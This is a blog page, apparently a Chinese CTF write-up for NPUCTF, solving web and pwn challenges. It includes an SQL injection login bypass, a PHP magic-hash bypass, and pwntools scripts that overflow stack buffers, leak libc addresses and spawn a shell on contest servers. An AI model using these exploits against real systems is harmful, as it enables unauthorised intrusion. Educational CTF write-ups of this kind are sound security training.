@@ -1,0 +1,664 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    
+    <meta charset="utf-8" />
+    <meta name="baidu-site-verification" content="vvVgSQUzPU" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="keywords" content="undefined" />
+     
+    <meta name="description" content="null" />
+    
+    <title>
+      NPUCTF部分Writeup - ios&#39;s blog
+    </title>
+    <link rel="manifest" href="/manifest.json" />
+    <link rel="shortcut icon" href="undefined" type="image/x-icon" />
+    <link rel="stylesheet" href="/style/style.css">
+  <link rel="stylesheet" href="/css/prism-ghcolors.css" type="text/css"></head>
+  <body>
+    <div id="fixed-menu">
+      <span class="iconfont icon-arrowup"></span>
+    </div>
+    <div id="progress">
+      <div class="line"></div>
+    </div>
+    <!-- <div id="search-wrap">
+      <input type="text" placeholder="Search Keys"/>
+
+      <div class="result"></div>
+    </div> -->
+    <div id="head">
+      
+      <a
+        href="/"
+        class=""
+      >
+        首页
+      </a>
+      
+      <a
+        href="/archives"
+        class=""
+      >
+        归档
+      </a>
+      
+      <a
+        href="/about"
+        class=""
+      >
+        关于
+      </a>
+      
+      <a
+        href="/link"
+        class=""
+      >
+        友情链接
+      </a>
+      
+    </div>
+    <div id="container">
+      <div id="main">
+        <div class="navbar">
+          <div class="toggle">
+            <span class="iconfont icon-menu toggle-icon"></span>
+          </div>
+          <div class="search">
+            <div class="input-warp">
+              <!-- <span class="iconfont icon-sousuo"></span> -->
+              <input
+                type="text"
+                name=""
+                class="st-default-search-input"
+                id="site-search"
+                placeholder="Search Keys"
+              />
+            </div>
+          </div>
+        </div>
+        <div class="content">
+          <article class="post-entry">
+    <div class="header">
+      <div class="title">NPUCTF部分Writeup</div>
+      <div class="meta">
+        <span class="item">
+          <span class="iconfont icon-time-circle"></span>
+          <span>2018/05/13</span>
+        </span>
+
+        
+        
+         
+          <span class="item">
+            <span class="iconfont icon-tag1"></span>
+            <span>
+                
+                  
+                    <a href="/tags/Pwn">Pwn</a>
+                  
+                
+                  
+                    <a href="/tags/writeup">writeup</a>
+                  
+                
+                  
+                    <a href="/tags/NPUCTF">NPUCTF</a>
+                  
+                
+                  
+                    <a href="/tags/WEB">WEB</a>
+                  
+                
+            </span>
+          </span>
+         
+
+        
+          <span class="item leancloud-visitors" id="/2018/05/13/NPUCTF部分Writeup/" data-flag-title="NPUCTF部分Writeup">
+            <span class="iconfont icon-eye1"></span>
+            <span class="leancloud-visitors-count"></span>
+          </span>
+        
+      </div>
+      <div>
+      </div>
+    </div>
+    <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p><img src="/2018/05/13/NPUCTF部分Writeup/1.jpg" alt="ida1"></p>
+<p>查看源码<br><img src="/2018/05/13/NPUCTF部分Writeup/2.jpg" alt="ida1"><br>得到Flag : flag{begin_to_npuctf}</p>
+<ul>
+<li><a id="more"></a>
+<the rest="" of="" contents="" |="" 余下全文=""><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2></the></li>
+</ul>
+<p><img src="/2018/05/13/NPUCTF部分Writeup/3.jpg" alt="ida1"><br>猜测应该是js算法题目</p>
+<p>查看源码发现主要算法<br><img src="/2018/05/13/NPUCTF部分Writeup/4.jpg" alt="ida1"></p>
+<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>可以看到</p>
+<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre><code>var b = &quot;56ab34c15b73a457069c58a43fcfc640&quot;;
+var d = 0x0;
+var e = a.substr(0x8, 0x5);
+if ($.md5(e) == b.replace(/3/ig, ++d+1).replace(/8/ig, &#39;e&#39;))
+</code></pre><p>通过控制台可以获得e<br><img src="/2018/05/13/NPUCTF部分Writeup/5.jpg" alt="ida1"><br>解密可以获得9-13位 happy</p>
+<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre><code>if (f.substr(0x5, 0x2) == &quot;be&quot; &amp;&amp; $.md5(f.substr(0x0 / d, d + 0x3)) == &quot;327a6c4304ad5938eaf0efb6cc3e53dc&quot;) {
+</code></pre><p>可得 6 7位为 be<br>解密  327a6c4304ad5938eaf0efb6cc3e53dc 可获得 0-3位为 flag</p>
+<p><img src="/2018/05/13/NPUCTF部分Writeup/6.jpg" alt="ida1"></p>
+<p>运行可以获得g=np</p>
+<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre><code>if (r.substr((++d) * 0x3, 0x6) == g.concat(&quot;uctf&quot;) &amp;&amp; c.test(a)) {
+</code></pre><p>分析可知 得到的g和uctf进行拼接 得到 npuctf 15-22位</p>
+<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre><code>&lt;pre name=&quot;code&quot; class=&quot;javascript&quot; style=&quot;font-size: 13.3333px;&quot;&gt;r.charCodeAt(--d) - 0x19 == r.charCodeAt(--d) //r[1]-0x19==r[0]
+之后根据正则可知r[0]=&#39;_&#39;
+</code></pre><p> 倒回去看r变量的判断</p>
+<p>0的值为_下划线unicode码加25</p>
+<p>所以在控制台输入下面3条代码，即可得r两个相同的字符为xx</p>
+<p>var r = ‘_’</p>
+<p>console.log(r.charCodeAt(0))</p>
+<p>console.log(String.fromCharCode(95+25))<br>所以最后拼接可得<br>flag{be_happy_xxnpuctf}</p>
+<h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><p>题目：你需要懂一些Linux命令，已经为你装好了某著名黑客工具。<br><img src="/2018/05/13/NPUCTF部分Writeup/7.jpg" alt="ida1"><br>测试可知 可以执行一些命令 并且 ls列出了flag所在目录<br><img src="/2018/05/13/NPUCTF部分Writeup/8.jpg" alt="ida1"><br>但是却无法使用 cd cat 等一系列命令</p>
+<p>右键查看源码<br><img src="/2018/05/13/NPUCTF部分Writeup/9.jpg" alt="ida1"><br>发现提示 可以猜测应该 是可以使用nmap<br>所以使用命令 </p>
+<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre><code>nmap -iL /tmp/flag/flag.txt
+</code></pre><p><img src="/2018/05/13/NPUCTF部分Writeup/10.jpg" alt="ida1"><br>得到Flag : flag{nice_Command}</p>
+<h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p><img src="/2018/05/13/NPUCTF部分Writeup/11.jpg" alt="ida1"><br>进入发现需要登录</p>
+<p>右键查看源码得到提示<br><img src="/2018/05/13/NPUCTF部分Writeup/12.jpg" alt="ida1"><br>这里存在PHP弱类型漏洞 提交name=240610708 pass=QNKCDZO 成功绕过</p>
+<p><img src="/2018/05/13/NPUCTF部分Writeup/13.jpg" alt="ida1"></p>
+<h3 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h3><p> 根据放的hint可尝试万能密码绕过<br>提交 ‘or’=’or’ 成功绕过</p>
+<p><img src="/2018/05/13/NPUCTF部分Writeup/14.jpg" alt="ida1"></p>
+<h3 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h3><p>提示了name为 npusec 但是密码未知所以这里猜测需要爆破密码</p>
+<p>通过robots.txt泄露 </p>
+<p><img src="/2018/05/13/NPUCTF部分Writeup/15.jpg" alt="ida1"><br>得到 密码字典 所以进行爆破即可</p>
+<p><img src="/2018/05/13/NPUCTF部分Writeup/16.jpg" alt="ida1"><br>得到密码为 1234npuuu<br><img src="/2018/05/13/NPUCTF部分Writeup/17.jpg" alt="ida1"><br>登录获得Flag : flag{W3lcOme_com3_to_ctf}</p>
+<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="pwn-checkin"><a href="#pwn-checkin" class="headerlink" title="pwn_checkin"></a>pwn_checkin</h2><p>载入ida分析</p>
+<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+0h] [ebp-48h]</span>
+
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"why not you input something?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>漏洞存在于gets函数<br>继续分析 </p>
+<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre><code>int call_system()
+{
+  return system(&quot;/bin/sh&quot;);
+}
+</code></pre><p>题目中提供了shell所以 只需要溢出 修改ret到 call_system 地址即可</p>
+<p>offset = rbp-48h -(rbp-0x4)</p>
+<p>所以构造exp</p>
+<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token comment" spellcheck="true">#p = process('./checkin')</span>
+p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'149.28.142.91'</span><span class="token punctuation">,</span><span class="token number">10000</span><span class="token punctuation">)</span>
+sys_addr <span class="token operator">=</span> <span class="token number">0x080484EB</span>
+
+payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x48</span> <span class="token operator">+</span><span class="token string">'aaaa'</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span>
+<span class="token keyword">print</span> payload
+<span class="token comment" spellcheck="true">#p.recv('why not you input something?')</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre>
+<h2 id="baby-bashjail"><a href="#baby-bashjail" class="headerlink" title="baby_bashjail"></a>baby_bashjail</h2><p>载入ida分析</p>
+<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char s; // [rsp+0h] [rbp-20h]
+  unsigned __int64 v5; // [rsp+18h] [rbp-8h]
+
+  v5 = __readfsqword(0x28u);
+  setvbuf(stdin, 0LL, 2, 0LL);
+  setvbuf(stdout, 0LL, 2, 0LL);
+  puts(&quot;======baby jail======&quot;);
+  while ( 1 )
+  {
+    putchar(62);
+    fgets(&amp;s, 20, stdin);
+    if ( (unsigned int)filter(&amp;s, 20LL) )
+      break;
+    system(&amp;s);
+  }
+  putchar(62);
+  puts(&quot;No way! Little Hacker!&quot;);
+  return 0;
+}
+</code></pre><p>发现程序提供了system 但是 使用前使用filter进行参数的判断<br>查看 filter函数</p>
+<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre><code>_int64 __fastcall filter(const char *a1)
+{
+  int i; // [rsp+18h] [rbp-8h]
+  int v3; // [rsp+1Ch] [rbp-4h]
+
+  v3 = strlen(a1);
+  for ( i = 0; i &lt; v3; ++i )
+  {
+    switch ( a1[i] )
+    {
+      case &#39;l&#39;:
+        return 1LL;
+      case &#39;s&#39;:
+        return 1LL;
+      case &#39;c&#39;:
+        return 1LL;
+    }
+    switch ( a1[i] )
+    {
+      case &#39;a&#39;:
+        return 1LL;
+      case &#39;t&#39;:
+        return 1LL;
+      case &#39;f&#39;:
+        return 1LL;
+      case &#39;l&#39;:
+        return 1LL;
+      case &#39;g&#39;:
+        return 1LL;
+      case &#39;*&#39;:
+        return 1LL;
+      case &#39;c&#39;:
+        return 1LL;
+    }
+  }
+  return deep_filter(a1);
+}
+</code></pre><p>进行判断检查 不能存在这些关键字母 并传入depp_filter<br>查看deep_filter</p>
+<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre><code>signed __int64 __fastcall deep_filter(const char *a1)
+{
+  int i; // [rsp+18h] [rbp-8h]
+  int v3; // [rsp+1Ch] [rbp-4h]
+
+  v3 = strlen(a1);
+  for ( i = 0; i &lt; v3; ++i )
+  {
+    switch ( a1[i] )
+    {
+      case &#39;b&#39;:
+        return 1LL;
+      case &#39;d&#39;:
+        return 1LL;
+      case &#39;e&#39;:
+        return 1LL;
+      case &#39;h&#39;:
+        return 1LL;
+      case &#39;i&#39;:
+        return 1LL;
+      case &#39;j&#39;:
+        return 1LL;
+      case &#39;k&#39;:
+        return 1LL;
+      case &#39;m&#39;:
+        return 1LL;
+      case &#39;n&#39;:
+        return 1LL;
+      case &#39;o&#39;:
+        return 1LL;
+      case &#39;p&#39;:
+        return 1LL;
+      case &#39;q&#39;:
+        return 1LL;
+      case &#39;r&#39;:
+        return 1LL;
+      case &#39;s&#39;:
+        return 1LL;
+      case &#39;u&#39;:
+        return 1LL;
+      case &#39;v&#39;:
+        return 1LL;
+      case &#39;w&#39;:
+        return 1LL;
+      case &#39;x&#39;:
+        return 1LL;
+      case &#39;y&#39;:
+        return 1LL;
+      case &#39;z&#39;:
+        return 1LL;
+    }
+  }
+  return 0LL;
+}
+</code></pre><p>哇 这么狠 原来就是把所有字母都过滤的<br>但是题目需要利用system进行flag的获取<br>argv[0]相当于 sh<br>所以 只需要传入 $0 就可以获取一个shell</p>
+<p>EXP</p>
+<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'149.28.142.91'</span><span class="token punctuation">,</span><span class="token number">10002</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'$0'</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre>
+<h2 id="Warrior-Tales"><a href="#Warrior-Tales" class="headerlink" title="Warrior_Tales"></a>Warrior_Tales</h2><p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-bash"><code class="language-bash">ios@ubuntu:~$ checksec warrior_tales
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ios/warrior_tales'</span>
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span>
+ios@ubuntu:~$
+</code></pre>
+<p>开启NX和RELRO</p>
+<p>载入IDA分析 漏洞存在于vlun函数里</p>
+<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">vlun</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+8h] [ebp-30h]</span>
+
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Hero! Now, write something for your story!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//漏洞利用点</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"What a wonderful ending!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>但是由于RELRO开启不能直接利用libc构造rop 必须leak出真实地址进而获得system_addr<br>之前由于偏移写错导致leak一直有问题0.0<br>通过构造循环来leak puts_addr<br>这里构造思路有两种<br>第一种</p>
+<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-python"><code class="language-python">puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
+puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
+vlun_addr <span class="token operator">=</span> <span class="token number">0x08048659</span>
+
+payload1 <span class="token operator">=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">52</span><span class="token operator">+</span> p32<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>vlun_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>
+</code></pre>
+<p>通过vlun函数循环进行leak</p>
+<p>第二种</p>
+<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre><code>puts_plt = elf.symbols[&#39;puts&#39;]
+puts_got = elf.got[&#39;puts&#39;]
+start_addr = 0x080484D0
+payload1 = &quot;A&quot;*52+ p32(puts_plt) + p32(start_addr) + p32(puts_got)
+</code></pre><p>通过循环程序进行leak</p>
+<p>可以获得puts_addr</p>
+<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0x59 bytes:
+    00000000  57 68 61 74  20 61 20 77  6f 6e 64 65  72 66 75 6c  │What│ a w│onde│rful│
+    00000010  20 65 6e 64  69 6e 67 21  0a a0 1c d9  f7 40 a5 d4  │ end│ing<span class="token operator">!</span>│····│·@··│
+    00000020  f7 60 23 d9  f7 20 39 d9  f7 c0 e0 d8  f7 0a 48 65  │·`<span class="token comment" spellcheck="true">#·│· 9·│····│··He│</span>
+    00000030  72 6f 21 20  4e 6f 77 2c  20 77 72 69  74 65 20 73  │ro<span class="token operator">!</span> │Now,│ wri│te s│
+    00000040  6f 6d 65 74  68 69 6e 67  20 66 6f 72  20 79 6f 75  │omet│hing│ for│ you│
+    00000050  72 20 73 74  6f 72 79 21  0a                        │r st│ory<span class="token operator">!</span>│·│
+    00000059
+puts_addr<span class="token operator">=</span> 0xf7d91ca0
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> system <span class="token operator">=</span> 0xf7d6cda0
+</code></pre>
+<p>由于服务器关闭 这里本地进行getshell</p>
+<p>exp</p>
+<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre><code>from pwn import *
+from struct import pack
+
+context.log_level = &#39;debug&#39; 
+#libc = ELF(&#39;libc.so.6&#39;)
+libc = ELF(&#39;/lib/i386-linux-gnu/libc.so.6&#39;)
+elf = ELF(&#39;warrior_tales&#39;)
+
+p1 = process(&#39;./warrior_tales&#39;)
+log.info(p1.recvuntil(&quot;&gt;&quot;))
+p1.sendline(&#39;ios&#39;)
+log.info(p1.recvuntil(&quot;select your choice:&quot;))
+p1.sendline(&#39;2&#39;)
+log.info(p1.recvuntil(&quot;select your choice:&quot;))
+p1.sendline(&#39;2&#39;)
+log.info(p1.recvuntil(&quot;select your choice:&quot;))
+p1.sendline(&#39;2&#39;)
+log.info(p1.recvuntil(&quot;select your choice:&quot;))
+p1.sendline(&#39;2&#39;)
+log.info(p1.recvuntil(&quot;select your choice:&quot;))
+p1.sendline(&#39;2&#39;)
+log.info(p1.recvuntil(&quot;select your choice:&quot;))
+p1.sendline(&#39;2&#39;)
+log.info(p1.recvuntil(&quot;select your choice:&quot;))
+p1.sendline(&#39;1&#39;)
+log.info(p1.recvuntil(&quot;Hero! Now, write something for your story!&quot;))
+
+
+
+puts_plt = elf.symbols[&#39;puts&#39;]
+puts_got = elf.got[&#39;puts&#39;]
+vlun_addr = 0x08048659
+gdb.attach(p1,&#39;b *0x08048659&#39;)
+raw_input(&#39;Go!!!&#39;)
+payload1 = &quot;A&quot;*52+ p32(puts_plt) + p32(vlun_addr) + p32(puts_got)
+p1.sendline(payload1)
+p1.recvuntil(&#39;What a wonderful ending!\n&#39;)
+data=u32(p1.recv(4))
+puts_addr=data
+print &#39;puts_addr= &#39;+hex(puts_addr)
+
+system=libc.symbols[&#39;system&#39;]-libc.symbols[&#39;puts&#39;]+puts_addr
+log.info(&#39;system = &#39; + hex(system))
+binsh=next(libc.search(&#39;/bin/sh&#39;))-libc.symbols[&#39;puts&#39;]+puts_addr
+
+payload=&quot;A&quot;*52+p32(system)+p32(1)+p32(binsh)
+p1.sendline(payload)
+
+p1.interactive()
+</code></pre><p>运行结果</p>
+<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-bash"><code class="language-bash">$ <span class="token function">whoami</span>
+<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent 0x7 bytes:
+    <span class="token string">'whoami\n'</span>
+<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0x4 bytes:
+    <span class="token string">'ios\n'</span>
+ios
+$
+</code></pre>
+<p>最后感谢下 kaka师傅指出我的错误(0~0) </p>
+
+
+  
+
+  
+    <div class="post-reward">
+      <div id="reward-button">请杯咖啡呗~</div>
+      <div id="qr">
+        <div class="wrap">
+            
+            <div class="bg-wrap">
+              <a href="/images/zhifubao.png" target="_block" class="bg" style="background-image:url('/images/zhifubao.png')"></a>
+              支付宝
+            </div>
+            
+            
+            <div class="bg-wrap">
+                <a href="/images/weixin.png" target="_block" class="bg" style="background-image:url('/images/weixin.png')"></a>
+              微信
+            </div>
+            
+        </div>
+      </div>
+    </div>
+  
+  
+  <div class="post-guide">
+    <div class="item left">
+        
+          <a href="2018/04/03/北邮网安杯Writeup/"><span class="iconfont icon-left"></span>北邮网安杯Writeup</a>
+        
+    </div>
+    <div class="item right">
+        
+          <a href="2018/06/09/Syclover-Pwn-┴╖╧░╠т/">Syclover-Pwn-练习题<span class="iconfont icon-right"></span></a>
+        
+    </div>
+  </div>
+
+  
+
+  <div class="post-copyright">
+    <div class="auth">
+      本文作者：<a href="http://iosmosis.github.io">ios</a>
+    </div>
+    <div class="link">
+      永久链接：<a href="http://iosmosis.github.io/2018/05/13/NPUCTF部分Writeup/">http://iosmosis.github.io/2018/05/13/NPUCTF部分Writeup/</a>
+    </div>
+    <div class="declare">
+      版权声明：本文首发于<a href="http://iosmosis.github.io">ios</a>的博客，转载请注明出处！
+    </div>
+  </div>
+
+  <div id="comment"></div>
+</article>
+        </div>
+        <footer>
+          <div class="copyright">
+            ©2019 <a href="http://iosmosis.github.io">ios</a>. Powered by
+            <a href="https://hexo.io">Hexo</a> &
+            <a href="https://github.com/shixiaohu2206/hexo-theme-huhu">hexo-theme-huhu</a>
+          </div>
+          
+        </footer>
+      </div>
+      <div id="card-wrap">
+        <div class="card">
+          <div class="logo-widget">
+            <div class="author">
+              ios
+            </div>
+            <div class="logo" style="background-image: url('/images/logo.jpeg')"></div>
+          </div>
+          
+          <div class="follow-widget">
+            
+            <a href="https://github.com/iosmosis" target="_block">
+              <span class="iconfont icon-github"></span>
+            </a>
+            
+            <a href="2417117320" target="_block">
+              <span class="iconfont icon-QQ"></span>
+            </a>
+             
+            <a href="/atom.xml" target="_block">
+              <span class="iconfont icon-rss"></span>
+            </a>
+            
+          </div>
+          <div class="category-widget">
+            <div class="title">
+              <span>Category</span>
+            </div>
+            <div class="list">
+              
+            </div>
+          </div>
+          <div class="tag-widget">
+            <div class="title">
+              <span>Tag cloud</span>
+            </div>
+            <div class="tag-cloud">
+              <a href="/tags/AI外挂/" style="font-size: 14px; color: #4a4a4a">AI外挂</a> <a href="/tags/About-Me/" style="font-size: 14px; color: #4a4a4a">About Me</a> <a href="/tags/BUPT/" style="font-size: 14px; color: #4a4a4a">BUPT</a> <a href="/tags/CTFwiki/" style="font-size: 14px; color: #4a4a4a">CTFwiki</a> <a href="/tags/Getshell/" style="font-size: 14px; color: #4a4a4a">Getshell</a> <a href="/tags/Hexo/" style="font-size: 14px; color: #4a4a4a">Hexo</a> <a href="/tags/Jarvis-OJ/" style="font-size: 14px; color: #4a4a4a">Jarvis OJ</a> <a href="/tags/MISC/" style="font-size: 14px; color: #4a4a4a">MISC</a> <a href="/tags/NPUCTF/" style="font-size: 14px; color: #4a4a4a">NPUCTF</a> <a href="/tags/Pwn/" style="font-size: 20px; color: #4a4a4a">Pwn</a> <a href="/tags/RE/" style="font-size: 17px; color: #4a4a4a">RE</a> <a href="/tags/ROP/" style="font-size: 14px; color: #4a4a4a">ROP</a> <a href="/tags/S2-045/" style="font-size: 14px; color: #4a4a4a">S2-045</a> <a href="/tags/Syclover/" style="font-size: 14px; color: #4a4a4a">Syclover</a> <a href="/tags/WEB/" style="font-size: 17px; color: #4a4a4a">WEB</a>
+            </div>
+          </div>
+           
+          <div class="toc-widget">
+            <div class="title">
+              <span>Toc</span>
+            </div>
+            <div class="post-toc">
+              <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB"><span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#签到"><span class="toc-text">签到</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#代码"><span class="toc-text">代码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#分析"><span class="toc-text">分析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#命令"><span class="toc-text">命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#login"><span class="toc-text">login</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#第二关"><span class="toc-text">第二关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第三关"><span class="toc-text">第三关</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN"><span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn-checkin"><span class="toc-text">pwn_checkin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#baby-bashjail"><span class="toc-text">baby_bashjail</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Warrior-Tales"><span class="toc-text">Warrior_Tales</span></a></li></ol></li></ol>
+            </div>
+          </div>
+           
+        </div>
+        
+      </div>
+    </div>
+    <!-- swiftype -->
+    
+    <!-- swiftype -->
+  <script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true}});</script></body>
+  
